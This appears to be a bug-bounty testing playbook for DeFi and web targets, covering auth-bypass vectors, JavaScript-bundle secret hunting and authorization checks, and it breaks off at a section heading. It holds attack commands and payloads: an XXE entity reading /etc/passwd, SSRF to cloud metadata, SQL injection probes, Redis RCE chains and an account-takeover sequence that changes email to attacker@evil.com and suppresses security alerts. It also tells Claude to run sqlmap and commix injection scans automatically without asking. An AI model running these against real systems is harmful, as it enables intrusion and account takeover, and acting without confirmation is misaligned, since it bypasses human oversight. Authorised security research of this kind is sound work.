# DEEP-ANALYSIS-PLAYBOOK.md — Phase 4: Deep Dive

Used AFTER kill gate triage (Phase 3). Every finding that passed the kill gate gets analyzed in depth here. Max 3 hours per finding.

---

## 4.1 Authentication Analysis Framework

**18 attack vectors. Test ALL before marking auth as "secure."**

**JWT vectors (4, 4b, 16, 17, 18): If JWT was detected in Phase 2, these are AUTOMATED by the JWT Arsenal.**
Read `JWT-ARSENAL-PLAYBOOK.md` and run the arsenal instead of manual testing. The arsenal tests 45+ adversarial tokens across 8 libraries in 5 languages in ~35 minutes, replacing ~5h of manual JWT testing.

```bash
# Quick arsenal invocation (replaces vectors 4, 4b, 16, 17, 18):
cd ~/Desktop/BUGS/jwt-nullgate-research/jwt-arsenal
source ../pocs/.venv/bin/activate
python3 -m pipeline.runner --lib "{detected_library}" --source "{source_path}" --tools "1,2,3,4,5,6,7,8" --verbose
```

| # | Vector | curl Template | What to Look For |
|---|--------|--------------|-----------------|
| 1 | Missing auth on write endpoint | `curl -X POST https://{api}/endpoint -H "Content-Type: application/json" -d '{"key":"value"}'` | 200/201 without auth header |
| 2 | SIWE field validation | Sign message with wrong `domain`, `chainId`, `nonce`, `issuedAt` | Server accepts mismatched fields |
| 3 | Static/predictable nonce | `for i in $(seq 1 5); do curl -s https://{api}/auth/nonce; echo; done` | Same nonce or predictable pattern |
| 4 | JWT algorithm confusion | **AUTOMATED: JWT Arsenal Tool 5 (TR-001 to TR-012) + Tool 7 (T01-T05)** | Server accepts modified token |
| 4b | JWT null-gate bypass (CVE-2026-29000) | **AUTOMATED: JWT Arsenal Tool 1 (null-gate scan) + Tool 7 (T06, T07)** | Server decrypts JWE, `toSignedJWT()` returns null, signature check skipped |
| 5 | CORS misconfiguration | `curl -H "Origin: https://evil.com" -I https://{api}/endpoint` | `Access-Control-Allow-Origin: *` or reflects origin |
| 6 | Secrets in JS bundle | `grep -iP "password\|secret\|master\|admin\|api.key\|apiKey\|bearer" bundles.js` | Credentials, API keys, master passwords |
| 7 | Path traversal past auth | `curl https://{api}/../../admin/users` and `%2f..%2f` variants | Bypasses auth middleware |
| 8 | HTTP method override | `curl -X GET https://{api}/admin -H "X-HTTP-Method-Override: POST"` | GET treated as POST |
| 9 | Missing rate limiting | `for i in $(seq 1 100); do curl -s -o /dev/null -w "%{http_code}\n" https://{api}/auth/login -d '...'; done \| sort \| uniq -c` | No 429 after many requests |
| 10 | Cross-dApp session replay | Take auth token from dApp A, use at dApp B (same protocol, different domain) | Token accepted across domains |
| 11 | Debug/internal endpoints | Probe `/debug`, `/internal`, `/_admin`, `/graphql`, `/__`, `/api/internal` | Unprotected internal functionality |
| 12 | Expired token acceptance | Use token past expiry, or with `exp` in the past | Server doesn't validate expiration |
| 13 | Parameter pollution | `curl "https://{api}/endpoint?role=user&role=admin"` | Server uses last/first parameter |
| 14 | WebSocket auth bypass | Connect `wss://{domain}/ws` without auth token | Unauthenticated WS connection |
| 15 | API version bypass | Try `/v1/`, `/v2/`, `/api/v0/`, `/api/beta/` on protected endpoints | Older API lacks auth middleware |
| 16 | Null-gate / type-confusion bypass | **AUTOMATED: JWT Arsenal Tool 1 (null-gate scan) + Tool 2 (pipeline tracer) + Tool 4 (key provenance)**. Also covers non-JWT: OAuth2 token type confusion, SAML unsigned-in-encrypted, protobuf oneof, instanceof bypass. Manual grep for non-JWT: `grep -rn "!= null.*verify\|instanceof.*verify\|is_some.*verify\|is not None.*verify"` | Auth check silently skipped for entire request |
| 17 | JWK header auto-trust (AUTH-001) | **AUTOMATED: JWT Arsenal Tool 6 (header surface mapper) + Tool 7 (T07 jwk_self_signed token) + Tool 3 (RFC 8725 §2.4 check)**. Manual: `grep -rn "jwk.*header\|header.*jwk\|key is None.*jwk\|jku.*fetch\|x5c.*cert"` | Full auth bypass — attacker controls claims and verification key. Ref: Authlib <= 1.6.8 |
| 18 | DER algorithm confusion (JOSE-001) | **AUTOMATED: JWT Arsenal Tool 5 (TR-002 DER confusion) + Tool 7 (T04 hmac_rsa_der token) + Tool 8 (JOSE-001 mapping)**. Manual: `grep -rn "is_pem_format\|is_ssh_key\|HMACKey\|algorithms.*None\|verify.*False"` | Full auth bypass if DER keys used. Ref: python-jose all versions |
| 19 | OAuth2/OIDC state machine | **See OAUTH2-OIDC-PLAYBOOK.md** — 12 vectors: state CSRF, redirect_uri manipulation, PKCE downgrade, token type confusion, issuer confusion, scope escalation, grant type abuse, revocation bypass, code replay, client auth bypass, race condition, wrapper CVEs | Depends on vector — redirect_uri bypass = CRITICAL (token theft), PKCE downgrade = CRITICAL (code interception) |
| 20 | SAML signature wrapping | If SAML SSO detected: craft assertion with valid signature but moved XML element — signed content != processed content. `grep -rn "SAMLResponse\|saml2\|saml:Assertion\|ds:Signature\|xmldsig" --include="*.java" --include="*.py" --include="*.rb"`. Check: ruby-saml (CVE-2025-25291/25292), python3-saml, OneLogin toolkit, Spring SAML. Test: duplicate `<Assertion>` with modified `<Subject>`, keep signature on original. | Full auth bypass — attacker controls identity assertion. Isomorphic to JWT null-gate: signed content != processed content |
| 21 | SAML XML entity injection | If SAML: inject XXE in `SAMLResponse` (`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`), comment injection (`<!-- -->`) to break XPath validation, certificate confusion (embed attacker cert in `<KeyInfo>` — same pattern as JWK auto-trust AUTH-001). `grep -rn "DocumentBuilder\|SAXParser\|etree\.parse\|lxml\|REXML" --include="*.java" --include="*.py" --include="*.rb"`. Check: is XXE protection enabled? Is XPath validation comment-safe? | XXE = SSRF/file read. Signature wrapping = auth bypass. Certificate confusion = full impersonation |
| 22 | GraphQL deep attacks | **See DEFI-FULLSTACK §F1.7** — introspection (schema leak → admin mutations), batching (rate limit bypass), query depth DoS, field-level auth gaps, mutation IDOR, alias-based batching | Introspection = recon. Mutation IDOR = data manipulation. Depth DoS = availability |
| 23 | Deserialization chains | **See DEFI-FULLSTACK §F1.9** — pickle (Python), Jackson enableDefaultTyping (Java), yaml.load (Python), ObjectInputStream (Java), node-serialize (Node), Marshal.load (Ruby), unserialize (PHP). Check Redis sessions, message queue payloads, cache entries | RCE if attacker controls serialized input to unsafe deserializer |
| 24 | WebSocket auth & CSWSH | **See DEFI-FULLSTACK §F1.8** — unauthenticated WS connection, Cross-Site WebSocket Hijacking (Origin not validated), messages triggering on-chain actions without re-auth, no rate limiting on WS messages | Unauthenticated WS + on-chain trigger = fund theft |

### SIWE Compliance Checklist (EIP-4361)

| Field | Required | Attack if Missing/Invalid |
|-------|----------|--------------------------|
| `domain` | YES | Cross-site signature replay |
| `address` | YES | Signature for wrong account |
| `uri` | YES | Cross-site replay |
| `version` | YES | Version downgrade |
| `chain-id` | YES | Cross-chain replay |
| `nonce` | YES | Replay attack |
| `issued-at` | YES | Stale signature replay |
| `expiration-time` | Recommended | Indefinite session |
| `not-before` | Optional | Premature use |
| `request-id` | Optional | Request correlation |
| `resources` | Optional | Scope escalation |

**Verification procedure:**
```bash
# Get SIWE nonce
curl -s https://{api}/auth/nonce | jq .

# Check nonce uniqueness (5 rapid requests)
for i in $(seq 1 5); do curl -s https://{api}/auth/nonce | jq -r '.nonce // .data // .'; done | sort | uniq -d
# Duplicates → FINDING: Predictable/reused nonce

# For each field: sign message with field intentionally WRONG, attempt verify
# If server accepts → FINDING: Missing {field} validation
```

---

## 4.2 Smart Contract Mathematical Proof Construction

### Rounding Attacks
```
1. Identify division operations in deposit/withdraw/swap/liquidate paths
2. Find minimum input producing rounding error > dust threshold
3. Calculate profit per transaction × max transactions per block
4. Prove cumulative extraction exceeds gas cost

Grep: / mulDiv mulWadDown mulWadUp divWadDown divWadUp FullMath.mulDiv Math.ceilDiv
```

### Overflow/Underflow
```
1. Identify unchecked{} blocks or Solidity < 0.8.0
2. Find arithmetic on user-controlled inputs inside unchecked
3. Calculate input values causing overflow
4. Prove overflow leads to incorrect state (not just reverts)

Grep: unchecked { type(uint256).max type(int256).min
```

### Share Inflation / First Depositor
```
1. Identify ERC4626 vaults or share-based accounting
2. Check for virtual offset (OpenZeppelin _decimalsOffset)
3. If no offset: calculate minimum donation to inflate share price
4. Prove subsequent depositor loses funds

Key functions: deposit() mint() convertToShares() convertToAssets()
```

### Oracle Manipulation
```
1. Identify price oracle calls (Chainlink, Uniswap TWAP, custom)
2. Check validation: staleness, min/max bounds, deviation check
3. Calculate cost to manipulate vs profit from manipulation
4. Check flash loan + manipulation + action in same tx

Grep: latestRoundData observe consult getAmountOut getPrice slot0
Note: slot0 = Uniswap V3 SPOT price (NOT TWAP) — directly manipulable
```

### Invariant Breaking
```
1. Identify protocol invariants (totalSupply == sum of balances, etc.)
2. Find code paths that modify state without maintaining invariant
3. Construct sequence of calls that breaks invariant
4. Prove broken invariant leads to extractable value

Grep: totalSupply totalAssets totalDebt require(invariant assert(
```

---

## 4.3 API Endpoint Deep Testing

**For every endpoint that passed surface scan:**

### Documentation Format
```markdown
### {METHOD} {path}

**Auth Required:** Yes/No
**Risk Category:** {from surface map}

#### Request
```
curl -s -X {METHOD} "https://{api}{path}" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer {token}" \
  -d '{"key": "value"}'
```

#### Response (verbatim)
```json
{PASTE FULL RESPONSE — NEVER SUMMARIZE}
```

#### Analysis
- Status: {code}
- Auth behavior: {tested with/without}
- Notable fields: {anything interesting}
- Data persistence: {write→read cycle tested?}
- Error info leaked: {stack traces, internal paths, DB info}
```

**CRITICAL:** Save responses verbatim to `evidence/web/api-responses/{METHOD}-{path-slug}-{timestamp}.json`. Never summarize.

### Database Write Detection
```bash
UNIQUE="gd-probe-$(date +%s)-$(head -c 4 /dev/urandom | xxd -p)"

# POST unique value
curl -s -X POST "https://{api}/endpoint" \
  -H "Content-Type: application/json" \
  -d "{\"name\": \"${UNIQUE}\"}" \
  -o evidence/web/api-responses/write-test-post.json

# GET and verify persistence
curl -s "https://{api}/endpoint" | grep -c "${UNIQUE}"

# If found → confirmed write capability
# Repeat WITHOUT auth → if works → CRITICAL finding
```

---

## 4.4 Infrastructure Deep Dive

### Signing Architecture Mapping

Questions to answer:
1. WHO signs transactions? (hot wallet, relayer, multisig, MPC?)
2. WHERE are signing keys? (server-side, HSM, browser, external?)
3. WHAT can the signer do? (arbitrary calls, limited scope, time-locked?)
4. HOW MANY signers? (single key = catastrophic single point of failure)

**Evidence sources:**
- On-chain: Check `tx.origin` and `msg.sender` of admin transactions
- API: Look for `/sign`, `/approve`, `/execute`, `/relay` endpoints
- JS: Search for `ethers.Wallet`, `privateKey`, `signTransaction`, `signMessage`
- Errors: Signing failures reveal architecture ("relayer timeout", "signer unavailable")

**Key management table:**
```markdown
| Component | Key Type | Location | Protection | Single Point of Failure? |
|-----------|----------|----------|-----------|-------------------------|
```

### RPC Proxy Namespace Audit (Rule 26 v2)

Auto-trigger: ANY DeFi target with a web frontend that makes blockchain calls.

**CSP header mining:** The Content-Security-Policy connect-src directive often reveals
RPC provider URLs with embedded auth tokens. Check CSP for:
- `go.getblock.io/*` (GetBlock with token in URL)
- `*.quiknode.pro/*` (QuikNode with token in URL)
- Custom proxy domains (`proxy-app.*`, `rpc.*`, `web3.*`)

**Error response mining:** Call endpoints with malformed blockchain data.
The error handler may include the raw RPC URL in the client-facing response.
Request Finance pattern: `persistTransaction` error leaked full QuikNode URL with auth token.

**Free bearer token pattern:** DeFi frontends need RPC access for anonymous users
(price quotes, gas estimation). The auth token endpoint often has zero credentials.
1inch pattern: `proxy-app.1inch.io/v2.0/auth/token` returns free ES256 JWT, 1h validity.
Get the token, then test ALL json-rpc methods.

**debug_storageRangeAt vs eth_getStorageAt:** The debug method enumerates consecutive
storage slots WITHOUT knowing the key hash. eth_getStorageAt requires the exact slot.
The distinction is directory listing vs file read.

Confirmed findings: 1inch ($15K-$50K HackenProof), Request Finance ($1K+), Tothemoon.

### Cloud Infrastructure Detection

| Signal | Inference |
|--------|-----------|
| `*.vercel.app` | Vercel hosting |
| `*.fly.dev` | Fly.io backend |
| `*.railway.app` | Railway |
| `*.herokuapp.com` | Heroku |
| `CF-Ray` header | Cloudflare CDN |
| `x-amz-*` headers | AWS |
| `x-goog-*` headers | Google Cloud |
| `x-ms-*` headers | Azure |
| `uvicorn` server | Python/FastAPI |
| `.next` in paths | Next.js |

### Database Technology from Errors
```bash
# Trigger type errors to leak DB info
curl -s -X POST "https://{api}/endpoint" -H "Content-Type: application/json" -d '{"id": "not_a_number"}'

# Missing required field
curl -s -X POST "https://{api}/endpoint" -H "Content-Type: application/json" -d '{}'

# SQL injection probe
curl -s -X POST "https://{api}/endpoint" -H "Content-Type: application/json" -d "{\"id\": \"1' OR '1'='1\"}"

# Look for: PostgreSQL, MySQL, MongoDB, SQLite, Prisma, SQLAlchemy, TypeORM in responses
```

---

## 4.5 JavaScript Bundle Analysis

**MANDATORY for every web target.**

### Download Script
```bash
TARGET="https://{app_domain}"
OUTDIR="evidence/web/js-bundles"
mkdir -p "$OUTDIR"

curl -sL "$TARGET/" > "$OUTDIR/index.html"

grep -oP '(?:src|href)="([^"]*\.js[^"]*)"' "$OUTDIR/index.html" | \
  sed 's/.*="\(.*\)"/\1/' | sort -u | while read js; do
    case "$js" in
      http*) url="$js" ;;
      //*) url="https:$js" ;;
      /*) url="${TARGET}${js}" ;;
      *) url="${TARGET}/${js}" ;;
    esac
    fname=$(echo "$js" | sed 's/[^a-zA-Z0-9._-]/_/g')
    curl -sL "$url" -o "$OUTDIR/$fname"
    echo "Downloaded: $url ($(wc -c < "$OUTDIR/$fname") bytes)"
done

cat "$OUTDIR"/*.js > "$OUTDIR/all-bundles.js" 2>/dev/null
echo "Total: $(wc -c < "$OUTDIR/all-bundles.js") bytes"
```

### 30+ Grep Patterns
```bash
F="evidence/web/js-bundles/all-bundles.js"

echo "=== API Keys & Secrets ==="
grep -oP '(?:api[_-]?key|apiKey|API_KEY|secret|SECRET)["\s:=]+["\x27]([a-zA-Z0-9_\-]{16,})["\x27]' "$F"

echo "=== Private Keys ==="
grep -oP '0x[a-fA-F0-9]{64}' "$F"
grep -oP '(?:private[_-]?key|PRIVATE_KEY|privateKey)["\s:=]+' "$F"

echo "=== Bearer Tokens ==="
grep -oP 'Bearer [a-zA-Z0-9._\-]+' "$F"

echo "=== JWT Tokens ==="
grep -oP 'eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*' "$F"

echo "=== Hardcoded Passwords ==="
grep -iP '(?:password|passwd|pwd)["\s:=]+["\x27]([^"\x27]{4,})["\x27]' "$F"

echo "=== Internal URLs ==="
grep -oP 'https?://[a-zA-Z0-9._-]+\.(internal|local|dev|staging|test|corp)\b[^\s"]*' "$F"

echo "=== API Endpoints ==="
grep -oP 'https?://api\.[a-zA-Z0-9._-]+[^\s"]*' "$F" | sort -u
grep -oP '"/api/[a-zA-Z0-9/_-]+"' "$F" | sort -u

echo "=== AWS Keys ==="
grep -oP 'AKIA[A-Z0-9]{16}' "$F"

echo "=== Alchemy/Infura RPC ==="
grep -oP 'https://[a-z]+\.(g\.alchemy|infura)\.io/v[0-9]/[a-zA-Z0-9_-]+' "$F"

echo "=== Firebase ==="
grep -oP 'AIza[a-zA-Z0-9_\\-]{35}' "$F"
grep -oP 'https://[a-zA-Z0-9-]+\.firebaseio\.com' "$F"

echo "=== Supabase ==="
grep -oP 'https://[a-zA-Z0-9]+\.supabase\.co' "$F"

echo "=== Sentry DSN ==="
grep -oP 'https://[a-f0-9]+@[a-z0-9.]+\.sentry\.io/[0-9]+' "$F"

echo "=== GraphQL ==="
grep -oP 'https?://[^\s"]+/graphql' "$F"

echo "=== WebSocket URLs ==="
grep -oP 'wss?://[^\s"]+' "$F" | sort -u

echo "=== Contract Addresses ==="
grep -oP '0x[a-fA-F0-9]{40}' "$F" | sort -u

echo "=== Environment Variables ==="
grep -oP 'process\.env\.[A-Z_]+' "$F" | sort -u
grep -oP 'import\.meta\.env\.[A-Z_]+' "$F" | sort -u

echo "=== Admin/Internal Paths ==="
grep -oP '"/(admin|internal|debug|_next|api/internal|backoffice)[^\s"]*"' "$F"

echo "=== WalletConnect Project IDs ==="
grep -oP 'projectId["\s:]+["\x27]([a-f0-9]{32})["\x27]' "$F"

echo "=== Hardcoded Role Addresses ==="
grep -oP '(?:owner|admin|operator|guardian|relayer|treasury|fee)["\s:]+["\x27]?(0x[a-fA-F0-9]{40})' "$F"

echo "=== Third-Party Domains ==="
grep -oP 'https?://[a-zA-Z0-9._-]+\.[a-z]{2,}' "$F" | sed 's|https\?://||' | sed 's|/.*||' | sort -u
```

---

## 4.6 Integration Deep Dives

### Relayer Flow Analysis
```
1. Identify relayer (on-chain tx patterns or API)
2. Map: User → API → Relayer → Chain flow
3. Check: Can user submit directly to relayer? (bypass API auth)
4. Check: Does relayer validate all parameters? (or trusts API blindly)
5. Check: What if relayer key compromised? (scope of damage)
```

### Batch Processing
```
1. Find batch/queue endpoints (/batch, /queue, /process, /jobs)
2. Check: Can batch items be manipulated between queue and execution?
3. Check: Atomicity? (partial batch failure handling)
4. Check: Race condition between submission and processing
```

### Webhook/Callback Verification
```bash
# Check unsigned webhook acceptance
curl -X POST "https://{api}/webhook" -d '{"event":"test"}' -H "Content-Type: application/json"
# 200 without signature → unsigned webhooks accepted

# SSRF via webhook URL
curl -X POST "https://{api}/settings/webhook" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' \
  -H "Content-Type: application/json"
```

---

## 4.7 Cross-Chain Messaging Analysis (AUTO if detected in §2.11)

```
1. Identify messaging protocol (LayerZero V1/V2, Axelar, Wormhole, Hyperlane, CCIP)
2. For EACH message-receiving function:
   a. Source validation: chain ID AND sender address? (not just one)
   b. expressExecute has same validation as normal path? (CrossCurve $3M)
   c. Replay protection: nonce/messageId?
   d. Gas limit validation: attacker can't cause partial execution?
   e. Failed message handling: silent drops? blocking queue?
3. Trust config: trusted remotes, DVN threshold, ISM type
4. Admin controls: can admin change trust config without timelock?
```

## 4.8 Proxy Upgrade Chain Trace (see DEFI-FULLSTACK §F4.1)

```
1. For EACH proxy: resolve full chain (EOA → Safe → Timelock → ProxyAdmin → Proxy → Impl)
2. Identify weakest link in chain
3. Check implementation initialization (_disableInitializers)
4. Check cross-chain consistency (same architecture on all chains?)
5. Beacon proxies: compromising beacon = ALL proxies upgraded
```

## 4.9 Structural MEV (ONLY if NOT excluded by program)

```
Pre-gate: Confirm program does NOT exclude frontrunning/MEV/sandwich
1. Price function analysis: spot (manipulable) vs TWAP vs Chainlink
2. Reserve-based pricing: moveable in same block?
3. Liquidation MEV: flash loan + liquidate in single tx?
4. Quantify: annual extraction vs TVL (> 0.1% = reportable)
```

## 4.10 Supply Chain Dependency Audit (see DEFI-FULLSTACK §F2.4)

```
1. Extract full transitive dependency tree
2. Scan for malicious signals: install scripts, wallet access, exfiltration
3. Typosquat detection, maintainer stability
4. CVE baseline (npm audit / pip-audit / cargo audit)
5. Critical: packages in auth/crypto/wallet paths
```

## 4.11 Off-Chain Infrastructure (see DEFI-FULLSTACK §F3.4-F3.6)

```
1. RPC node exposure: txpool/debug/admin/personal namespace
2. Keeper wallet audit: balances, approvals, multi-chain presence
3. Metadata integrity: mutable baseURI, IPFS single-pinner
4. Redis/data store deep analysis (from §2.15 scanner results):
   a. If no auth + CONFIG available → attempt CONFIG SET dir/dbfilename proof
      (write to /tmp only — never to production paths in bounty context)
   b. If sensitive keys found → classify data (session tokens, PII, API keys, wallet data)
   c. If SLAVEOF available → document replication exfiltration vector
   d. If CVE-2025-49844 detected + EVAL available → document Lua RCE chain
   e. If SSRF → Redis confirmed → document full SSRF→RCE chain via gopher://
   f. Check: is Redis used for session storage? (session hijacking via key enumeration)
   g. Check: is Redis used for rate limiting? (bypass by FLUSHDB)
   h. Check: is Redis used for job queues? (job injection via LPUSH/RPUSH)
```

---

## 4.12 Authenticated Surface Testing & Authorization Consistency (MANDATORY)

**This section is NON-NEGOTIABLE for any target with a web API.**

A WAF returning 403 means "requires auth", NOT "blocked". The production API is fully accessible with a valid Bearer token obtained via the normal login flow.

**Lesson learned:** Request Finance — 103 API routes extracted from JS bundle, including `DELETE /users/mfa`. All routes were noted as "high-value" but NEVER tested with authentication. Result: missed a CVSS 7.6 HIGH finding that was trivially discoverable with a single authenticated curl call.

### Step 1: Acquire Authenticated Session (from §2.15)

```bash
# Option A: Auth0/OIDC (browser-based)
# 1. Open app in browser, complete normal login
# 2. Open DevTools → Network → find a request to the API domain
# 3. Copy the Authorization: Bearer <token> header
# 4. Verify scope:
echo "<token>" | cut -d. -f2 | base64 -d 2>/dev/null | jq '{scope, exp, aud, iss}'

# Option B: SIWE/Web3 (wallet-based)
# 1. Connect wallet in app, sign SIWE message
# 2. Capture session token from cookies or Authorization header

# Option C: Email/password
# 1. Create account on app
# 2. Login via API:
curl -s -X POST "${API}/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"TestP@ss123"}' | jq .
```

**Record in evidence:**
```markdown
| Field | Value |
|-------|-------|
| Token type | Bearer JWT / Session cookie / API key |
| Scope | openid profile email (default) |
| Expiry | 24h / 1h / session |
| Refresh mechanism | refresh_token / silent auth / none |
| Elevated scope available | sudo / mfa_verified / admin |
```

### Step 2: Test ALL Routes from Bundle Extraction

```bash
TOKEN="<captured_token>"
API="https://{api_domain}"

# For EVERY route extracted from JS bundle in Phase 2:
while IFS= read -r route; do
  method=$(echo "$route" | awk '{print $1}')
  path=$(echo "$route" | awk '{print $2}')

  # Test with standard token
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X "$method" "${API}${path}" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -H "X-Network: live" \
    --max-time 10 2>/dev/null)
  echo "$code $method $path"
done < evidence/web/api-routes-extracted.txt | tee evidence/web/api-responses/authed-scan.txt

# Flag security-critical operations
grep -E "^(200|204)" evidence/web/api-responses/authed-scan.txt | \
  grep -iE "mfa|2fa|totp|sso|password|email|session|security|account.*delete|role|permission"
```

### Step 3: Authorization Consistency Matrix (THE KEY TEST)

**For every target with elevated auth (sudo, re-auth, MFA challenge, step-up):**

Map which operations require elevated auth and which don't. The inconsistency IS the finding.

```bash
TOKEN="<standard_token>"
API="https://{api_domain}"

# === Security-Critical Operations (MUST require re-auth per OWASP ASVS V3.7.1) ===
echo "=== SECURITY-CRITICAL (should require sudo/re-auth) ==="

# MFA management
curl -s -o /dev/null -w "%{http_code} DELETE /users/mfa\n" \
  -X DELETE "${API}/users/mfa" -H "Authorization: Bearer $TOKEN" -H "X-Network: live"

# SSO management
curl -s -o /dev/null -w "%{http_code} DELETE /users/accounts/google\n" \
  -X DELETE "${API}/users/accounts/google" -H "Authorization: Bearer $TOKEN" -H "X-Network: live"

# Password change
curl -s -o /dev/null -w "%{http_code} PATCH /users (password)\n" \
  -X PATCH "${API}/users" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -H "X-Network: live" \
  -d '{"password":"NewP@ss123"}'

# Email change
curl -s -o /dev/null -w "%{http_code} PATCH /users (email)\n" \
  -X PATCH "${API}/users" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -H "X-Network: live" \
  -d '{"email":"attacker@evil.com"}'

# Session/token revocation
curl -s -o /dev/null -w "%{http_code} DELETE /auth/sessions\n" \
  -X DELETE "${API}/auth/sessions" -H "Authorization: Bearer $TOKEN" -H "X-Network: live"

# Account deletion
curl -s -o /dev/null -w "%{http_code} DELETE /users\n" \
  -X DELETE "${API}/users" -H "Authorization: Bearer $TOKEN" -H "X-Network: live"

# API key management
curl -s -o /dev/null -w "%{http_code} DELETE /apps\n" \
  -X DELETE "${API}/apps" -H "Authorization: Bearer $TOKEN" -H "X-Network: live"

# Notification preferences (security alerts)
curl -s -o /dev/null -w "%{http_code} PATCH /users (disabledEmails)\n" \
  -X PATCH "${API}/users" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -H "X-Network: live" \
  -d '{"disabledEmails":["emailChangeConfirmation","emailChangeAlert"]}'

echo ""
echo "=== NON-SECURITY OPERATIONS (baseline — what auth level do these require?) ==="

# View profile
curl -s -o /dev/null -w "%{http_code} GET /users\n" \
  "${API}/users" -H "Authorization: Bearer $TOKEN" -H "X-Network: live"

# View apps
curl -s -o /dev/null -w "%{http_code} GET /apps\n" \
  "${API}/apps" -H "Authorization: Bearer $TOKEN" -H "X-Network: live"

# Update non-security preferences
curl -s -o /dev/null -w "%{http_code} PATCH /users (preferences)\n" \
  -X PATCH "${API}/users" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -H "X-Network: live" \
  -d '{"defaultCurrency":"EUR"}'
```

### Step 4: Build the Authorization Matrix

```markdown
| Operation | Sensitivity | Standard Token | Sudo Token | MFA Challenge | Finding? |
|-----------|------------|----------------|------------|---------------|----------|
| DELETE /users/mfa | CRITICAL | | | | |
| DELETE /users/accounts/{sso} | CRITICAL | | | | |
| PATCH /users {email} | HIGH | | | | |
| PATCH /users {password} | HIGH | | | | |
| DELETE /users | HIGH | | | | |
| PATCH /users {disabledEmails} | MEDIUM* | | | | |
| DELETE /auth/sessions | MEDIUM | | | | |
| GET /apps | LOW | | | | |
| PATCH /users {preferences} | LOW | | | | |

* disabledEmails is MEDIUM alone but HIGH when it includes security notification types
```

**Finding criteria:**
- Any CRITICAL operation accepting standard token → **HIGH finding** (CVSS 7.6+)
- Any HIGH operation accepting standard token → **MEDIUM finding** (CVSS 5.0+)
- Any LOW operation requiring HIGHER auth than a CRITICAL operation → **proves inconsistency = oversight**
- Security notification suppression via standard token → **enabler finding** (chain with MFA deletion)

### Step 5: Notification Suppression Check

```bash
# Check if security notifications can be silently disabled
# This is a SEPARATE finding from the auth level issue

# 1. Get current notification settings
curl -s "${API}/users" -H "Authorization: Bearer $TOKEN" -H "X-Network: live" | \
  jq '.disabledEmails // "not present"'

# 2. Try to suppress security-critical notifications
curl -s -X PATCH "${API}/users" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -H "X-Network: live" \
  -d '{"disabledEmails":["emailChangeConfirmation","emailChangeAlert","mfaDisabled","ssoUnlinked","loginFromNewDevice","passwordChanged"]}' | \
  jq '.disabledEmails'

# 3. If accepted → finding: security notifications are suppressible
# This enables silent account takeover (step 2 in the ATO kill chain)
```

### Reference: Industry Standards

- **OWASP ASVS V3.7.1** (CWE-306): Re-authentication required for sensitive transactions
- **NIST SP 800-63B-4 §4.1.2.1**: Authentication at max AAL for account modifications
- **HackerOne precedents**: #587910, #783258, #1139535, #2197244 ($1,000 bounty)
- **CVE precedents**: CVE-2023-40260 (CVSS 9.1), CVE-2026-27946 (CVSS 8.2)

---

## 4.13 Injection Proxy Bridge — CLAUDE AUTO-EXECUTES (MANDATORY)

**Claude runs this entire pipeline automatically. No asking, no suggesting. Same as JWT Arsenal.**

**Auto-trigger signals** (ANY detected → Claude executes NOW):
- Base64 blobs in request headers/body/cookies
- `Content-Type: application/cbor|msgpack|protobuf|grpc-web+proto|xml`
- JWT tokens with injectable claims (`sub`, `role`, `email`, `user_id`, `admin`)
- XML bodies (especially ISO 20022: `pain.001`, `pacs.008`, `camt.053`)
- gRPC-Web endpoints, WebAuthn attestation/assertion objects
- HAR/Burp captures available, OpenAPI specs available
- Any nested encoding chain (base64→JSON, gzip→protobuf, base64→CBOR)

**Tool:** `~/Desktop/BUGS/injection-proxy/` (venv: `.venv/`)
**Formula: N parsers × M engines = N×M injection coverage.**

### What Claude Executes (in order)

```bash
cd ~/Desktop/BUGS/injection-proxy && source .venv/bin/activate

# 1. Detect layers on captured values
python3 proxy.py --detect "<captured_value>"

# 2a. If HAR/Burp capture available → auto-generate profiles
python3 proxy.py --auto-profile --har traffic.har --output-dir profiles/auto/
python3 proxy.py --auto-profile --burp-xml export.xml --output-dir profiles/auto/

# 2b. If OpenAPI/Swagger spec available → generate from spec
python3 proxy.py --from-spec openapi.yaml --output-dir profiles/auto/

# 2c. If neither available → create YAML profile manually from template
#     (see profiles/examples/ for templates)

# 3. Dry-run to verify chain
python3 proxy.py --profile profiles/auto/<generated>.yaml --dry-run --payload "' OR 1=1--"

# 4. Batch scan ALL generated profiles
python3 proxy.py --scan-all profiles/auto/ --categories sqli,ssti,cmdi,xss,xxe -v

# 5. For interesting findings → deep scan with engine
python3 proxy.py --profile <profile>.yaml --engine sqlmap
python3 proxy.py --profile <profile>.yaml --engine commix
```

**21 layers:** base64, base64url, url, hex, gzip, deflate, html_entity, unicode_escape, json, cbor, msgpack, xml, bson, yaml, toml, protobuf_raw, multipart, jwt_payload (alg:none), jwt_header, rlp, abi

### High-Value Injectable Fields

- `user_id`, `sub`, `role`, `email` (IDOR, privilege escalation)
- `cmd`, `query`, `filter`, `search` (command/SQL injection)
- `url`, `redirect`, `callback`, `next` (SSRF, open redirect)
- `filename`, `path`, `template` (path traversal, SSTI)

### Example Profiles by Target Type

| Target Pattern | Profile Template | Layers |
|---------------|-----------------|--------|
| REST API + JSON body | `json-body-simple.yaml` | json |
| API gateway + base64 header | `base64-json-header.yaml` | base64 → json |
| JWT auth endpoint | `jwt-claim.yaml` | jwt_payload (alg:none) |
| ISO 20022 payment | `xml-iso20022.yaml` | xml (XPath) |
| WebAuthn registration | `cbor-webauthn.yaml` | base64url → cbor |
| gRPC-Web service | `grpc-protobuf.yaml` | base64 → protobuf_raw |

---

## 4.14 Client-Side Cryptographic Chain Tracing (MANDATORY for web targets with crypto)

